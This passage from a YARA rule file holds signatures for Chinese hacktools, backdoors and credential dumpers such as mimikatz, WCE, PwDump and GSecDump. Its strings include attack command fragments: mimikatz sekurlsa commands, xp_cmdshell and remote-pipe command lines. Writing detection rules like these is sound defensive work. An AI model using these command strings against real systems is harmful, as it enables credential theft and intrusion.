		super_rule = 1
		hash0 = "e5c9aec1173f3b10f1bcc00f596bc20e7a317b22"
		hash1 = "bc93d74a118ad7650b6a08c83225304c38d64b67"
		hash2 = "6737165ac300bff3d1c137f52cf65721ba832e11"
	strings:
		$s3 = "support@dswlab.com" fullword
		$s12 = "--=====www.dswlab.com=====--" fullword
		$s15 = "unarc.dll" fullword
		$s16 = "Antivirus Database.T.(c)dswlab 2006-2008." fullword
	condition:
		all of them
}

rule CN_Hacktools_icedump_generic {
	meta:
		description = "Chinese Hacktool Archive - from files icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, icedump.exe, kernel.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "db2987597e1c0e45226bfbdc4f06e10e8c8c6281"
		hash1 = "1e6d41c9cd126d8d6e8f073d89e66c2612592686"
		hash2 = "adaa3076d7324ba51ec25bb4855e9b4cc4256dd5"
		hash3 = "9337cccb82b2f8f5b5b53ac5ae5fbccb71db5da0"
		hash4 = "3adef3622f7b25ecb0d898821ae71d452270cce8"
		hash5 = "73aa65c8d1ae5562fda06696861937d1736c96c3"
		hash6 = "30f0479cea673952fd712aee99ece20961a008ae"
		hash7 = "9d5bd2d039a78ad3151eecd9d14282ecbc9525e1"
		hash8 = "7aa213a227390b54708e3a0c932a904c44fa24d1"
		hash9 = "b18d0719be88a9b53738cbdff4b25e2eb74cb90d"
		hash10 = "260c50e5bd06cb3715b6c33a7d8a6532f641ecfd"
		hash11 = "928bb2b8eed24563c6e528f7fd6e627d985d7587"
		hash12 = "cc8194df268a24f751e7f44cbf7e7123e1f27ce2"
	strings:
		$s5 = "sJICEDUMP: ExtractNamePos: failed to install exception handler" fullword
		$s6 = "ICEDUMP: strlen: failed to uninstall exception handler" fullword
	condition:
		all of them
}

rule CN_Hacktools_Xscan_xscan_gui_Xscan_xscan_gui_xscan_gui {
	meta:
		description = "Chinese Hacktool Archive - from files Xscan.exe, xscan_gui.exe, Xscan.exe, xscan_gui.exe, xscan_gui.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "f1078d3bf21acf84fd16e5992724d0a7f2cbefa4"
		hash1 = "4a8b0e335c58ba20017dd8c35960b9b10871753c"
		hash2 = "a69521b182b9e9758e6a92decc2ebe37aba99496"
		hash3 = "a07a3b3be26d672a7e4994ee008eded6c9227eee"
		hash4 = "a9e900510396192eb2ba4fb7b0ef786513f9b5ab"
	strings:
		$s1 = "%-15s %7s %6s %s" fullword
		$s2 = "PLUGIN-GET-ADDR-FAILED" fullword
		$s4 = "Function \"FindPlugin()\" causes an exception, failed to alert user." fullword
		$s5 = "REPORT-SCAN-TIME" fullword
		$s6 = "%-15s %7d %6d " fullword
		$s8 = "FindFirst() failed, can't find plug-in." fullword
		$s9 = "REPORT-COMPLETE" fullword
	condition:
		all of them
}

rule CN_Hacktools_067cli_067iis6cli_dbgiis6cli {
	meta:
		description = "Chinese Hacktool Archive - from files 067cli.exe, 067iis6cli.exe, dbgiis6cli.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "5746cd0fae26cf43a13e70941c428ea7687c39a9"
		hash1 = "623e96e3a8706f8961364b4602cabbd65233f60c"
		hash2 = "87632f3ba4e0f87767d0b5ed369d0776e48af41e"
	strings:
		$s0 = "http://nongmin-cn.8u8.com" fullword
		$s1 = "ntboot.exe -install" fullword
		$s6 = "http://z0mbie.host.sk/" fullword
		$s14 = "xfocus(www.xfocus.net)" fullword
		$s15 = "#SYN 172.18.1.5 15 0 1000" fullword
		$s20 = "byshell v0.67 beta2," fullword
	condition:
		3 of them
}

rule CN_Hacktools_hxdef073_hxdef084_hxdef100 {
	meta:
		description = "Chinese Hacktool Archive - from files hxdef073.exe, hxdef084.exe, hxdef100.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "8ecbfa20c5860f59a15fb227b4d1b7c715911850"
		hash1 = "d94c4b9a4d5906da33f1532d7020ccc5863b8fb0"
		hash2 = "7b5da025029a579c0f5bfa39cd1ad5cc25dd2677"
	strings:
		$s1 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\" fullword
		$s3 = "[HIDDEN SERVICES]" fullword
		$s4 = "\\\\.\\mailslot\\hxdef-rks" fullword
		$s12 = "BACKDOORSHELL" fullword
	condition:
		all of them
}

rule CN_Hacktools_dllTest_dllTest_dllTest {
	meta:
		description = "Chinese Hacktool Archive - from files dllTest.dll, dllTest.dll, dllTest.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "f98d70007376a6510eb5c160019bbf1017aceace"
		hash1 = "be49653979213ee27e150f0a50651a5ea50d6dd2"
		hash2 = "1ba36ffad9faee53089cbadb374248beb49a4284"
	strings:
		$s2 = "dllTest.dll" fullword
		$s4 = "--restart the computer" fullword
		$s12 = "--shutdown the computer" fullword
		$s13 = "pskill " fullword
		$s14 = "Shell OK" fullword
		$s15 = "--quit,can connect again" fullword
		$s16 = "--backdoor exit" fullword
	condition:
		all of them
}

rule CN_Hacktools_bdcli073_bdcli084_bdcli100 {
	meta:
		description = "Chinese Hacktool Archive - from files bdcli073.exe, bdcli084.exe, bdcli100.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		super_rule = 1
		hash0 = "c4c6f8f12520a3e6182b78093443792c5bcfe5bf"
		hash1 = "c41bd31b4f540dc0bc16b19a2a74e875ea2e2c27"
		hash2 = "af216aeb094568e5f8d79b6950454c92d62fa4a5"
	strings:
		$s4 = "Bad password!" fullword
		$s5 = "backdoor is not installed on " fullword
		$s8 = "backdoor is corrupted on " fullword
		$s11 = "Pass: " fullword
		$s12 = "backdoor found" fullword
		$s16 = "backdoor ready" fullword
		$s17 = "connecting server ..." fullword
		$s18 = "receiving banner ..." fullword
	condition:
		all of them
}

/* Rules derived from toolset at http://qiannao.com/ls/905300366/33834c0c/ */

rule CN_Toolset_sig_1433_135_sqlr {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "8542c7fb8291b02db54d2dc58cd608e612bfdc57"
	strings:
		$s0 = "Connect to %s MSSQL server success. Type Command at Prompt." fullword ascii
		$s11 = ";DATABASE=master" fullword ascii
		$s12 = "xp_cmdshell '" fullword ascii
		$s14 = "SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver" ascii
	condition:
		all of them
}

rule CN_Toolset_PortReady {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file PortReady.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "b55eaf0e4237e946531c5a84c071d5bc55a67b4a"
	strings:
		$s0 = "mailto:dotpot@163.com" fullword ascii
		$s1 = "PortReady.ini" fullword ascii
		$s2 = "PortList.txt" fullword ascii
		$s3 = "GET HEAD HTTP/1.1" fullword ascii
		$s4 = "http://dotpot.533.net" fullword ascii
		$s6 = "Dotpot Port Ready" fullword wide
		$s7 = "CRTDLL.DLL" fullword ascii
		$s8 = "=%d->%d" fullword ascii
	condition:
		4 of them
}

rule CN_Toolset_X_ray26_X_way {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file X-way.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "eef26efdb9838d49c503541e21581490c29d769e"
	strings:
		$s0 = "LOADER ERROR" fullword ascii
		$s1 = "EXECUTABLE" fullword wide
		$s2 = "TGETHTTPFRM" fullword wide
		$s3 = "TSNIFFERFRM" fullword wide
		$s6 = "TTFTPSERVERFRM" fullword wide
		$s8 = "CLOSEDFOLDER" fullword wide
		$s9 = "ntwdblib.dll" fullword ascii
		$s10 = "TPORTSCANSETFRM" fullword wide
		$s11 = "TTFTPDIRFRM" fullword wide
		$s14 = "THISREPORTFRM" fullword wide
		$s16 = "TPORTLISTFRM" fullword wide
	condition:
		all of them
}

rule CN_Toolset_OpenTelnet {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file OpenTelnet.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "d60ecafdf386ef7507f5fbee261f598a66879950"
	strings:
		$s0 = "Usage:  %s \\\\IP Username Password Port" fullword ascii
		$s2 = "%s service is started successfully! %s service is running!" fullword ascii
		$s5 = "Code from: www.opengram.com, by refdom, refdom@263.net" fullword ascii
		$s6 = "Telnet Port is %d. You can try:\"telnet ip %d\", to connect the server!" fullword ascii
		$s10 = "By uhhuhy" ascii
		$s11 = "http://uhhuh.myetang.com" ascii
		$s19 = "The Telnet Service default setting:NTLMAuthor=2  TelnetPort=23" fullword ascii
	condition:
		4 of them
}

rule CN_Toolset_LScanPortss {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file LScanPortss.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "f3e27f3b2976c0ce2f1ba53503f9afa3d9d94915"
	strings:
		$s0 = "LScanPort.EXE" fullword wide
		$s1 = "Compressed by Petite (c)1999 Ian Luck." fullword ascii
		$s2 = "LScanPort Microsoft" fullword wide
		$s3 = ".petite" fullword ascii
		$s4 = "LScanPort" fullword wide
	condition:
		3 of them
}

rule CN_Toolset_sig_1433_135_s {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file s.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "897c009fe3d94cf14f97b77fee783449bba2ad1b"
	strings:
		$s0 = "forming Time: %d/" fullword ascii
		$s2 = "G --> " ascii
		$s3 = "CRTDLL.DLL" fullword ascii
		$s5 = "DRDHt.txt" fullword ascii
		$s10 = "CTRL+C Is Presse" ascii
	condition:
		all of them
}

rule CN_Toolset_sig_1433_135_cor {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file cor.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "719bcc6340ceac67f5faabf9f8d3fcd1e5756c72"
	strings:
		$s0 = ":%s file.txt \"1433 192.168.0.253 1234\" sqlhello.exe" fullword ascii
		$s1 = ":%s 0 file.txt \"1234 192.168.0.253\" ms04011.exe" fullword ascii
		$s2 = "*design:SunLion[EST]"
		$s4 = "http://sunlion.126.com" fullword ascii
		$s3 = "http://www.eviloctal.com" fullword ascii
		$s5 = "[EST] http://www.blacksky.cn *" fullword ascii
		$s7 = "open the %s error..." fullword ascii
		$s14 = "Welcome To EvilOctalSecurityTeam" fullword ascii
	condition:
		3 of them
}

rule CN_Toolset_NTscan_NTCmd {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file NTCmd.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "5bc26103c2b7566f0aaa934455d22d8bdbfb3c92"
	strings:
		$s0 = "pipecmd \\\\%s -U:%s -P:\"\" %s" fullword ascii
		$s1 = "Usage:  %s <HostName|IP> <Username> <Password>" fullword ascii
		$s2 = "pipecmd \\\\%s -U:%s -P:%s %s" fullword ascii
		$s3 = "============By uhhuhy (Mar 17,2003) - http://uhhuh.myetang.com============" fullword ascii
		$s4 = "Create pipe failed." fullword ascii
		$s5 = "=======================NTcmd v0.10 for NTscan v1.0========================" fullword ascii
		$s7 = "NTcmd>" fullword ascii
	condition:
		3 of them
}

rule CN_Toolset_China_classic_network_saber_saber {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file saber.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "b37f9ca30aa5f41fc5894e3043e3ad913389e6de"
	strings:
		$s0 = "socket.exe" fullword wide
		$s2 = "CCView.net socket" fullword wide
		$s3 = "331 Password requir" fullword
		$s4 = "CCView.net" fullword wide
		$s13 = "MAIL FROM:%" fullword ascii
	condition:
		all of them
}

rule CN_Toolset_NTscanNTscan {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file NTscanNTscan.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "0c6e93eaf50dde2edf35c1a1629fc26a92995c46"
	strings:
		$s0 = "NTscan.EXE" fullword wide
		$s1 = "LOADER ERROR" fullword ascii
		$s3 = "NTscan Microsoft" fullword wide
		$s7 = "NTscan" fullword wide
	condition:
		all of them
}

rule CN_Toolset_Shed_Shed {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file Shed.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "478a5ab4c23bc283dc577d48601f8a156a008dc1"
	strings:
		$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
		$s1 = "fpipe -l 53 -s 53 -r 80 192.168.1.101" fullword ascii
		$s3 = "shed.exe" fullword wide
		$s5 = "source port for that outbound connection being set to 53 also." fullword ascii
		$s8 = "http://keir.net" fullword wide
		$s9 = "%s [-hvu?] [-lrs <port>] [-i IP] IP" fullword ascii
		$s15 = "robin@keir.net" fullword wide
		$s16 = "Windows share scanner" fullword wide
		$s18 = "\\\\%d.%d.%d.%d\\%s" fullword ascii
	condition:
		3 of them
}

rule CN_Toolset_CheckHost {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file CheckHost.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "7139c43840e6b5aa1fe211c8296ead2f27e2d3c3"
	strings:
		$s0 = "[%s]: Function \"CheckHost()\" causes an exception." fullword ascii
		$s1 = "port.ini" fullword ascii
		$s2 = "CreateFileMapping() failed, error code: %lu" fullword ascii
		$s5 = "OS: %s; PORT/TCP: %s" fullword ascii
	condition:
		all of them
}

rule CN_Toolset_dat_xpf {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file xpf.sys"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "761125ab594f8dc996da4ce8ce50deba49c81846"
	strings:
		$s0 = "projects\\X-Scan" fullword ascii
		$s5 = "objfre\\i386\\xpf.sys" fullword ascii
		$s6 = "\\Device\\XScanPF" fullword wide
		$s7 = "\\DosDevices\\XScanPF" fullword wide
		$s8 = "UnHook IoBuildDeviceIoControlRequest ok!" fullword ascii
	condition:
		all of them
}

rule CN_Toolset_LScanPortss_2 {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file LScanPortss.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "4631ec57756466072d83d49fbc14105e230631a0"
	strings:
		$s1 = "LScanPort.EXE" fullword wide
		$s3 = "www.honker8.com" fullword wide
		$s4 = "DefaultPort.lst" fullword ascii
		$s5 = "Scan over.Used %dms!" fullword ascii
		$s6 = "www.hf110.com" fullword wide
		$s15 = "LScanPort Microsoft " fullword wide
		$s18 = "L-ScanPort2.0 CooFly" fullword wide
	condition:
		4 of them
}

rule CN_Toolset_PortReady_PR {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file PR.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "e2050ce3ae28e4caccbc1b1271529edf2868ef87"
	strings:
		$s3 = "For more information,please visite http://dotpot.533.net" fullword ascii
		$s4 = "%s:PortList.txt" fullword ascii
		$s5 = "All available results appended to PortList.txt" fullword ascii
		$s6 = "PR.EXE <%s>[-%s] <%s1-%s2|%s1,%s2,...> [%s]" fullword ascii
		$s8 = "Get port banner" fullword ascii
		$s9 = "PortList.txt" fullword ascii
		$s11 = "http://dotpot.533.net" fullword ascii
		$s15 = "Dotpot PortReady" fullword ascii
		$s17 = "Only show open ports" fullword ascii
		$s18 = "CRTDLL.DLL" fullword ascii
	condition:
		4 of them
}

rule CN_Toolset_WINNTAutoAttack {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file WINNTAutoAttack.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "d096d45a12a567ea24d624fff3421d12126e6cd3"
	strings:
		$s0 = "TFRMPROCESSMAIN" fullword wide
		$s1 = "Windows NT/2000 " fullword wide
		$s3 = "ELHEADERPOINTBMP" fullword wide
		$s4 = "ELHEADERRIGHTBMP" fullword wide
		$s7 = "ELHEADERDESCBMP" fullword wide
		$s8 = "TFRMMSGCONTENT" fullword wide
		$s9 = "ELHEADERASCBMP" fullword wide
		$s10 = "ELHEADERLEFTBMP" fullword wide
		$s12 = "RPCNS4.DLL" fullword ascii
	condition:
		all of them
}

rule CN_Toolset_ipsearcher {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file ipsearcher.dll"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "1e96e9c5c56fcbea94d26ce0b3f1548b224a4791"
	strings:
		$s0 = "ipsearcher\\ipsearcher\\Release\\ipsearcher.pdb" fullword ascii
		$s1 = "http://www.wzpg.com" fullword ascii
		$s3 = "_GetAddress" fullword ascii
		$s4 = "ipsearcher.dll" fullword ascii
	condition:
		all of them
}

rule CN_Toolset_Ferrer_S_port_scanner_FerrerS {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file FerrerS.EXE"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "9a06092c2b2115dba05f6c6c57e9a580be20e91a"
	strings:
		$s0 = "WWW.CBN.YS168.COM" fullword wide
		$s1 = "HTTP://CBN.YS168.COM/" fullword wide
		$s2 = "4orming Time: %d/" fullword ascii
		$s3 = "G --> " fullword ascii
		$s5 = "RESULT.TXT" fullword ascii
	condition:
		3 of them
}

rule CN_Toolset_sig_1433_135_com {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file com.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "4e3df390edb05619cb065de1ffdad5c8d4a0c1b4"
	strings:
		$s0 = ":%s file.txt \"1433 192.168.0.253 1234\" sqlhello.exe" fullword ascii
		$s1 = ":%s 0 file.txt \"1234 192.168.0.253\" ms04011.exe" fullword ascii
		$s2 = "http://bbs.hksxs.com" fullword ascii
		$s13 = "Security Website!              *" fullword ascii
		$s14 = ".....      com.exe              *" fullword ascii
	condition:
		3 of them
}

rule CN_Toolset_NTscan_PipeCmd {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - file PipeCmd.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		hash = "a931d65de66e1468fe2362f7f2e0ee546f225c4e"
	strings:
		$s2 = "Please Use NTCmd.exe Run This Program." fullword ascii
		$s3 = "PipeCmd.exe" fullword wide
		$s4 = "\\\\.\\pipe\\%s%s%d" fullword ascii
		$s5 = "%s\\pipe\\%s%s%d" fullword ascii
		$s6 = "%s\\ADMIN$\\System32\\%s%s" fullword ascii
		$s7 = "%s\\ADMIN$\\System32\\%s" fullword ascii
		$s9 = "PipeCmdSrv.exe" fullword ascii
		$s10 = "This is a service executable! Couldn't start directly." fullword ascii
		$s13 = "\\\\.\\pipe\\PipeCmd_communicaton" fullword ascii
		$s14 = "PIPECMDSRV" fullword wide
		$s15 = "PipeCmd Service" fullword ascii
	condition:
		4 of them
}

rule CN_Toolset__Xscan_xscan_gui_xscan_gui {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - from files Xscan.exe, xscan_gui.exe, xscan_gui.exe"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		super_rule = 1
		hash0 = "8f2bc5c1da6a56e798a93d3f4ac003ef0340edec"
		hash1 = "a9e900510396192eb2ba4fb7b0ef786513f9b5ab"
		hash2 = "bbe6c3173dc6351dc572c8b0d236e34980a80e79"
	strings:
		$s1 = "system32\\drivers\\npf.sys" fullword
		$s4 = "hostlist.txt" fullword
		$s7 = "%s - network security scanner" fullword
		$s9 = "%-15s %7s %6s %s" fullword
		$s12 = "skip_host_noport" fullword
		$s16 = "REPORT-SCAN-TIME" fullword
		$s17 = "%-15s %7d %6d " fullword
		$s19 = "PORT-SCAN-OPTIONS" fullword
		$s20 = ".\\packet.dll" fullword
	condition:
		all of them
}

rule CN_Toolset__report_report_report {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - from files report.dll, report.dll, report.dll"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		super_rule = 1
		hash0 = "5f20a7b5cf0ffc06c22f84b04807e8f87ed55671"
		hash1 = "4582a7c1d499bb96dad8e9b227e9d5de9becdfc2"
		hash2 = "2a492aaaad4256a3d2fa991d71f0ca719f7be8ab"
	strings:
		$s0 = "<a href=\"http://www.xfocus.org\">X-Scan</a>" fullword
		$s6 = "REPORT-HOSTS-NUMBER-WARNING" fullword
		$s13 = "<TITLE>X-Scan Report</TITLE>" fullword
		$s18 = "REPORT-GENERATED" fullword
	condition:
		3 of them
}

rule CN_Toolset__XScanLib_XScanLib_XScanLib {
	meta:
		description = "Detects a Chinese hacktool from a disclosed toolset - from files XScanLib.dll, XScanLib.dll, XScanLib.dll"
		author = "Florian Roth"
		reference = "http://qiannao.com/ls/905300366/33834c0c/"
		date = "2015/03/30"
		score = 70
		super_rule = 1
		hash0 = "af419603ac28257134e39683419966ab3d600ed2"
		hash1 = "c5cb4f75cf241f5a9aea324783193433a42a13b0"
		hash2 = "135f6a28e958c8f6a275d8677cfa7cb502c8a822"
	strings:
		$s1 = "Plug-in thread causes an exception, failed to alert user." fullword
		$s2 = "PlugGetUdpPort" fullword
		$s3 = "XScanLib.dll" fullword
		$s4 = "PlugGetTcpPort" fullword
		$s11 = "PlugGetVulnNum" fullword
	condition:
		all of them
}

/* Shift from Clients */

rule APT_GSecDump {
	meta:
		description = "GSecDump variant from APT"
		author = "Florian Roth"
		hash = "9ae3ed7b94ce688a64c29092cf92ae5476607785"
		score = 60
	strings:
		$s9 = "GSECDUMP64" fullword wide
		$s10 = "http://www.mcafee.com"
	condition:
		all of them
}

rule WebCruiserWVS {
	meta:
		description = "WebCruiserWVS.exe Vulnerability Scanner"
		author = "Florian Roth"
		hash = "b5fc47021010ee65ee102dca278f02a2e69a4d32"
		score = 60
	strings:
		$s0 = "Created By WebCruiser - Web Vulnerability Scanner http://sec4app.com" fullword wide
		$s20 = "http://www.xxxxxxxx.com/info.php?id=" fullword
	condition:
		1 of them
}

rule APT_WCE_64_w64 {
	meta:
		description = "WCE Windows Credential Editor 64bit"
		author = "Florian Roth"
		hash = "cae43483a13d95500e883295ddf284a267614c64"
		score = 60
	strings:
		$s1 = "PIDCLSASS.EXE," fullword
		$s9 = "Password: " fullword
		$s11 = "Using WCE 8s S" fullword
	condition:
		all of them
}

rule APT_Tool_Enumshare: APT
{
	meta:
		author = "Robert Haist | SySS"
		description = "APT Hackertool - Enumshare"
		hash0 = "a95173c28946dc13feb314ca47063762"
		score = 70
	strings:
		$s1 = "[Assuming one session already existed or target is null.]"
		$s2 = "Usage: %s [-h] [-v] [-t target] [-u username] [-p password]"
	condition:
		2 of them
}

rule GSECdump_variant
{
	meta:
		description = "GSecDump variant"
		author = "Marc Stroebel"
		md5 = "4218aaf516d31d609534967d332bff14"
		date = "2014-04-24"
		score = 70
	strings:
		$s5 = "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineNa"
		$s6 = "Unable to query service status. Something is wrong, please manually check the st"
		$s7 = "pwdump6 Version %s by fizzgig and the mighty group at foofus.net" fullword
	condition:
		all of them
}

rule PWDump_variant {
	meta:
		description = "PwDump variant known from APT"
		author = "Florian Roth"
		date = "28.04.2014"
		score = 60
	strings:
		$s1 = "servpw64.exe"
		$s2 = "LSASS.EXE" wide
		$s3 = "mscoree.dll" wide
	condition:
	PEFILE and all of ($s*)
}

rule CredentialLogger_Logfile {
	meta:
		description = "Credential Logger generated log file"
		author = "Florian Roth"
		date = "28.10.2014"
		score = 70
	strings:
		$s1 = /\[[0-9][0-9]\/[0-9][0-9]\/20[0-9][0-9] [0-9][0-9]:[0-9][0-9]:[0-9][0-9]\]/ ascii
		$s3 = "LogonType: " ascii
		$s5 = "MessageType: " ascii
		$s4 = "Domain: " ascii
		$s2 = "User: " ascii
		$s6 = "Password: "
	condition:
		all of ($s*) and #s1 > 3 and #s3 > 3
}

/* Mimikatz */

rule Mimikatz_Memory_Rule_1 : APT {
	meta:
		author = "Florian Roth"
		date = "12/22/2014"
		score = 70
		type = "memory"
		description = "Detects password dumper mimikatz in memory"
	strings:
		$s1 = "sekurlsa::msv" fullword ascii
	    $s2 = "sekurlsa::wdigest" fullword ascii
	    $s4 = "sekurlsa::kerberos" fullword ascii
	    $s5 = "sekurlsa::tspkg" fullword ascii
	    $s6 = "sekurlsa::livessp" fullword ascii
	    $s7 = "sekurlsa::ssp" fullword ascii
	    $s8 = "sekurlsa::logonPasswords" fullword ascii
	    $s9 = "sekurlsa::process" fullword ascii
	    $s10 = "ekurlsa::minidump" fullword ascii
	    $s11 = "sekurlsa::pth" fullword ascii
	    $s12 = "sekurlsa::tickets" fullword ascii
	    $s13 = "sekurlsa::ekeys" fullword ascii
	    $s14 = "sekurlsa::dpapi" fullword ascii
	    $s15 = "sekurlsa::credman" fullword ascii
	condition:
		1 of them
}

rule Mimikatz_Memory_Rule_2 : APT {
	meta:
		description = "Mimikatz Rule generated from a memory dump"
		author = "Florian Roth - Florian Roth"
		type = "memory"
		score = 80
	strings:
		$s0 = "sekurlsa::" ascii
		$x1 = "cryptprimitives.pdb" ascii
		$x2 = "Now is t1O" ascii fullword
		$x4 = "ALICE123" ascii
		$x5 = "BOBBY456" ascii
	condition:
		$s0 and 1 of ($x*)
}

rule mimikatz
{
	meta:
		description		= "mimikatz"
		author			= "Benjamin DELPY (gentilkiwi)"
		tool_author		= "Benjamin DELPY (gentilkiwi)"
		score				= 80
	strings:
		$exe_x86_1		= { 89 71 04 89 [0-3] 30 8d 04 bd }
		$exe_x86_2		= { 89 79 04 89 [0-3] 38 8d 04 b5 }

		$exe_x64_1		= { 4c 03 d8 49 [0-3] 8b 03 48 89 }
		$exe_x64_2		= { 4c 8b df 49 [0-3] c1 e3 04 48 [0-3] 8b cb 4c 03 [0-3] d8 }

		$dll_1			= { c7 0? 00 00 01 00 [4-14] c7 0? 01 00 00 00 }
		$dll_2			= { c7 0? 10 02 00 00 ?? 89 4? }

		$sys_x86		= { a0 00 00 00 24 02 00 00 40 00 00 00 [0-4] b8 00 00 00 6c 02 00 00 40 00 00 00 }
		$sys_x64		= { 88 01 00 00 3c 04 00 00 40 00 00 00 [0-4] e8 02 00 00 f8 02 00 00 40 00 00 00 }

	condition:
		(all of ($exe_x86_*)) or (all of ($exe_x64_*)) or (all of ($dll_*)) or (any of ($sys_*))
}


rule mimikatz_lsass_mdmp
{
	meta:
		description		= "LSASS minidump file for mimikatz"
		author			= "Benjamin DELPY (gentilkiwi)"

	strings:
		$lsass			= "System32\\lsass.exe"	wide nocase

	condition:
		(uint32(0) == 0x504d444d) and $lsass and filesize > 50000KB
}


rule mimikatz_kirbi_ticket
{
	meta:
		description		= "KiRBi ticket for mimikatz"
		author			= "Benjamin DELPY (gentilkiwi)"
		score			= 80
	strings:
		$asn1			= { 76 82 ?? ?? 30 82 ?? ?? a0 03 02 01 05 a1 03 02 01 16 }

	condition:
		$asn1 at 0
}


rule wce
{
	meta:
		description		= "wce"
		author			= "Benjamin DELPY (gentilkiwi)"
		tool_author		= "Hernan Ochoa (hernano)"
		score			= 80
	strings:
		$hex_legacy		= { 8b ff 55 8b ec 6a 00 ff 75 0c ff 75 08 e8 [0-3] 5d c2 08 00 }
		$hex_x86		= { 8d 45 f0 50 8d 45 f8 50 8d 45 e8 50 6a 00 8d 45 fc 50 [0-8] 50 72 69 6d 61 72 79 00 }
		$hex_x64		= { ff f3 48 83 ec 30 48 8b d9 48 8d 15 [0-16] 50 72 69 6d 61 72 79 00 }

	condition:
		any of them
}


rule lsadump
{
	meta:
		description		= "LSA dump programe (bootkey/syskey) - pwdump and others"
		author			= "Benjamin DELPY (gentilkiwi)"
		score			= 80
	strings:
		$str_sam_inc	= "\\Domains\\Account" ascii nocase
		$str_sam_exc	= "\\Domains\\Account\\Users\\Names\\" ascii nocase
		$hex_api_call	= {(41 b8 | 68) 00 00 00 02 [0-64] (68 | ba) ff 07 0f 00 }
		$str_msv_lsa	= { 4c 53 41 53 52 56 2e 44 4c 4c 00 [0-32] 6d 73 76 31 5f 30 2e 64 6c 6c 00 }
